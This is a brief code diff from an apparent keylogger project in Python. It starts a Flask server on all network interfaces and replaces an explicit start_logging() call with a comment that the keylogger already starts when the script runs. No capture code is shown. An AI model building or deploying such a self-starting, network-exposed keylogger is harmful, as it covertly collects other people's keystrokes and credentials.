@@ -16,5 +16,4 @@ def activate_keylogger():
 if __name__ == "__main__":
     # Run the Flask app in a separate thread
     threading.Thread(target=app.run, kwargs={"host": "0.0.0.0", "port": 5000, "debug": False}).start()
-    # Start keylogger (already implemented in keylogger.py)
-    start_logging()
+    # The keylogger already starts when the script is run
